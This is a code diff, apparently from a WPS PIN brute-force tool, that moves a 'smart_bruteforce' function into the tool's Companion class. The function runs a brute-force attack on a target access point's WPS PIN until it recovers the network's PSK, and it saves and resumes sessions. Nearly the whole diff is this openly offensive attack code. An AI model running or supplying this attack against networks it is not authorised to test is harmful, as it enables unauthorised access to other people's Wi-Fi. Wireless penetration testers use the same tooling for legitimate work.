@@ -840,125 +840,125 @@ class Companion:
         print('[-] Second half of the PIN not found (tried 000-999 for the last 3 digits).')
         return False # Indicate failure to find second half
 
-def smart_bruteforce(self, bssid, start_pin=None, delay=None):
-    """
-    Performs a smart brute force attack on a given BSSID.
-    Implements session saving/resuming to allow continuation from the last attempted PIN.
-
-    Args:
-        bssid (str): The BSSID of the target AP.
-        start_pin (str, optional): A 4-to-7 character string to start the attack from.
-                                   e.g., '0000' for the beginning of the first half,
-                                   '1234567' to start from the second half.
-                                   If provided, it overrides any resume attempt.
-        delay (float, optional): Delay between PIN attempts.
-    """
-    # Determine the starting mask
-    if start_pin:
-        # Validate start_pin length (should be at least 4, max 7 for standard 8-digit PIN)
-        if not (4 <= len(start_pin) <= 7):
-             print(f'[!] Warning: start_pin length should be between 4 and 7. Got: "{start_pin}". Using first 7 chars if longer.')
-             start_pin = start_pin[:7]
-        mask = start_pin
-        print(f'[*] Starting brute force from specified PIN/mask: {mask}')
-    else:
-        # Attempt to restore a previous session
-        try:
-            filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
-            with open(filename, 'r') as file:
-                saved_mask = file.readline().strip()
-            # Ensure the saved mask is a valid numeric string
-            if not saved_mask.isdigit():
-                 print(f'[!] Warning: Invalid saved mask found in {filename}: {saved_mask}. Starting from beginning.')
-                 mask = '0000'
-            else:
-                if input(f'[?] Resume session for {bssid}? Mask was: {saved_mask}. [n/Y] ').lower() != 'n':
-                    mask = saved_mask
-                    print(f'[*] Resuming brute force from mask: {mask}')
+    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
+        """
+        Performs a smart brute force attack on a given BSSID.
+        Implements session saving/resuming to allow continuation from the last attempted PIN.
+    
+        Args:
+            bssid (str): The BSSID of the target AP.
+            start_pin (str, optional): A 4-to-7 character string to start the attack from.
+                                       e.g., '0000' for the beginning of the first half,
+                                       '1234567' to start from the second half.
+                                       If provided, it overrides any resume attempt.
+            delay (float, optional): Delay between PIN attempts.
+        """
+        # Determine the starting mask
+        if start_pin:
+            # Validate start_pin length (should be at least 4, max 7 for standard 8-digit PIN)
+            if not (4 <= len(start_pin) <= 7):
+                 print(f'[!] Warning: start_pin length should be between 4 and 7. Got: "{start_pin}". Using first 7 chars if longer.')
+                 start_pin = start_pin[:7]
+            mask = start_pin
+            print(f'[*] Starting brute force from specified PIN/mask: {mask}')
+        else:
+            # Attempt to restore a previous session
+            try:
+                filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
+                with open(filename, 'r') as file:
+                    saved_mask = file.readline().strip()
+                # Ensure the saved mask is a valid numeric string
+                if not saved_mask.isdigit():
+                     print(f'[!] Warning: Invalid saved mask found in {filename}: {saved_mask}. Starting from beginning.')
+                     mask = '0000'
                 else:
-                    mask = '0000' # User chose not to resume
-                    print(f'[*] Starting brute force from beginning (0000).')
-        except FileNotFoundError:
-            # No previous session file found, start from the beginning
-            mask = '0000'
-            print(f'[*] No previous session found for {bssid}. Starting from beginning (0000).')
-        except IOError as e:
-            # Handle potential file read errors
-            print(f'[!] Error reading session file: {e}. Starting from beginning (0000).')
-            mask = '0000'
-
-    try:
-        # Initialize the BruteforceStatus object here to access its methods and properties
-        # It needs to be initialized *after* the mask is determined
-        self.bruteforce = BruteforceStatus()
-        self.bruteforce.mask = mask # Initialize the mask in the status object too
-
-        print(f'[*] Bruteforce attack started with initial mask: {mask}')
-
-        # Determine whether we are starting with the first half or the second half based on the mask length
-        if len(mask) == 4:
-            f_half = self.__first_half_bruteforce(bssid, mask, delay)
-            # If the first half is found and the session wasn't fully completed (didn't get PSK)
-            if f_half and (self.connection_status.status != 'GOT_PSK'):
-                 # Start the second half from '000'
-                 s_half = '000'
-                 # Call the second half method, ensuring it starts correctly
-                 # The second half method itself will handle incrementing s_half
-                 # We need to make sure the overall mask tracking is handled within the loops if needed,
-                 # but BruteforceStatus handles it per attempt now.
-                 self.__second_half_bruteforce(bssid, f_half, s_half, delay)
-        elif len(mask) == 7: # e.g., '1234123' -> f_half='1234', s_half='123'
-            f_half = mask[:4]
-            s_half = mask[4:]
-            print(f'[*] Continuing second half with f_half: {f_half}, s_half: {s_half}')
-            # Pass the determined halves to the second half method
-            self.__second_half_bruteforce(bssid, f_half, s_half, delay)
-        else:
-            # This case should ideally not happen due to validation, but good practice
-            print(f'[!] Invalid initial mask length: {len(mask)}. Expected 4 or 7. Starting from 0000.')
-            f_half = self.__first_half_bruteforce(bssid, '0000', delay)
-            if f_half and (self.connection_status.status != 'GOT_PSK'):
-                self.__second_half_bruteforce(bssid, f_half, '000', delay)
-
-        # If the attack completes successfully (status is GOT_PSK), the main loop will finish naturally.
-        # If it gets interrupted by KeyboardInterrupt (or other), the exception handler below will run.
-
-    except KeyboardInterrupt:
-        print("\n[!] Attack interrupted by user.")
-        # Save the current state before exiting
-        current_mask_to_save = getattr(self, 'bruteforce', None)
-        if current_mask_to_save:
-             mask_to_write = current_mask_to_save.mask
-        else:
-             # Fallback: try to infer mask from context if BruteforceStatus isn't fully integrated into loops yet
-             # For now, rely on BruteforceStatus being updated correctly during attempts
-             print(" [i] BruteforceStatus object not found at interruption. Cannot save progress.")
-             return # Exit without saving if status object is missing
-
-        filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
+                    if input(f'[?] Resume session for {bssid}? Mask was: {saved_mask}. [n/Y] ').lower() != 'n':
+                        mask = saved_mask
+                        print(f'[*] Resuming brute force from mask: {mask}')
+                    else:
+                        mask = '0000' # User chose not to resume
+                        print(f'[*] Starting brute force from beginning (0000).')
+            except FileNotFoundError:
+                # No previous session file found, start from the beginning
+                mask = '0000'
+                print(f'[*] No previous session found for {bssid}. Starting from beginning (0000).')
+            except IOError as e:
+                # Handle potential file read errors
+                print(f'[!] Error reading session file: {e}. Starting from beginning (0000).')
+                mask = '0000'
+    
         try:
-            with open(filename, 'w') as file:
-                file.write(mask_to_write)
-            print(f'[i] Session saved in {filename}. Next run will resume from: {mask_to_write}')
-        except IOError as e:
-            print(f'[!] Failed to save session file: {e}')
-        # Re-raise the exception to terminate the function cleanly if needed by the caller
-        # raise # Uncomment if you want the calling loop to also stop on interrupt
-
-    # Optional: Handle other exceptions that might occur during the attack
-    except Exception as e:
-        print(f"[!] An unexpected error occurred during the attack: {e}")
-        # Attempt to save progress even on unexpected errors
-        current_mask_to_save = getattr(self, 'bruteforce', None)
-        if current_mask_to_save:
-             mask_to_write = current_mask_to_save.mask
-             filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
-             try:
-                 with open(filename, 'w') as file:
-                     file.write(mask_to_write)
-                 print(f'[i] Session saved in {filename} after error. Next run will resume from: {mask_to_write}')
-             except IOError as save_e:
-                 print(f'[!] Failed to save session file after error: {save_e}')
+            # Initialize the BruteforceStatus object here to access its methods and properties
+            # It needs to be initialized *after* the mask is determined
+            self.bruteforce = BruteforceStatus()
+            self.bruteforce.mask = mask # Initialize the mask in the status object too
+    
+            print(f'[*] Bruteforce attack started with initial mask: {mask}')
+    
+            # Determine whether we are starting with the first half or the second half based on the mask length
+            if len(mask) == 4:
+                f_half = self.__first_half_bruteforce(bssid, mask, delay)
+                # If the first half is found and the session wasn't fully completed (didn't get PSK)
+                if f_half and (self.connection_status.status != 'GOT_PSK'):
+                     # Start the second half from '000'
+                     s_half = '000'
+                     # Call the second half method, ensuring it starts correctly
+                     # The second half method itself will handle incrementing s_half
+                     # We need to make sure the overall mask tracking is handled within the loops if needed,
+                     # but BruteforceStatus handles it per attempt now.
+                     self.__second_half_bruteforce(bssid, f_half, s_half, delay)
+            elif len(mask) == 7: # e.g., '1234123' -> f_half='1234', s_half='123'
+                f_half = mask[:4]
+                s_half = mask[4:]
+                print(f'[*] Continuing second half with f_half: {f_half}, s_half: {s_half}')
+                # Pass the determined halves to the second half method
+                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
+            else:
+                # This case should ideally not happen due to validation, but good practice
+                print(f'[!] Invalid initial mask length: {len(mask)}. Expected 4 or 7. Starting from 0000.')
+                f_half = self.__first_half_bruteforce(bssid, '0000', delay)
+                if f_half and (self.connection_status.status != 'GOT_PSK'):
+                    self.__second_half_bruteforce(bssid, f_half, '000', delay)
+    
+            # If the attack completes successfully (status is GOT_PSK), the main loop will finish naturally.
+            # If it gets interrupted by KeyboardInterrupt (or other), the exception handler below will run.
+    
+        except KeyboardInterrupt:
+            print("\n[!] Attack interrupted by user.")
+            # Save the current state before exiting
+            current_mask_to_save = getattr(self, 'bruteforce', None)
+            if current_mask_to_save:
+                 mask_to_write = current_mask_to_save.mask
+            else:
+                 # Fallback: try to infer mask from context if BruteforceStatus isn't fully integrated into loops yet
+                 # For now, rely on BruteforceStatus being updated correctly during attempts
+                 print(" [i] BruteforceStatus object not found at interruption. Cannot save progress.")
+                 return # Exit without saving if status object is missing
+    
+            filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
+            try:
+                with open(filename, 'w') as file:
+                    file.write(mask_to_write)
+                print(f'[i] Session saved in {filename}. Next run will resume from: {mask_to_write}')
+            except IOError as e:
+                print(f'[!] Failed to save session file: {e}')
+            # Re-raise the exception to terminate the function cleanly if needed by the caller
+            # raise # Uncomment if you want the calling loop to also stop on interrupt
+    
+        # Optional: Handle other exceptions that might occur during the attack
+        except Exception as e:
+            print(f"[!] An unexpected error occurred during the attack: {e}")
+            # Attempt to save progress even on unexpected errors
+            current_mask_to_save = getattr(self, 'bruteforce', None)
+            if current_mask_to_save:
+                 mask_to_write = current_mask_to_save.mask
+                 filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
+                 try:
+                     with open(filename, 'w') as file:
+                         file.write(mask_to_write)
+                     print(f'[i] Session saved in {filename} after error. Next run will resume from: {mask_to_write}')
+                 except IOError as save_e:
+                     print(f'[!] Failed to save session file after error: {save_e}')
 
     def __print_with_indicators(self, level, msg):
         print('[{}] [{}] {}'.format(level, self.lastPwr, msg))
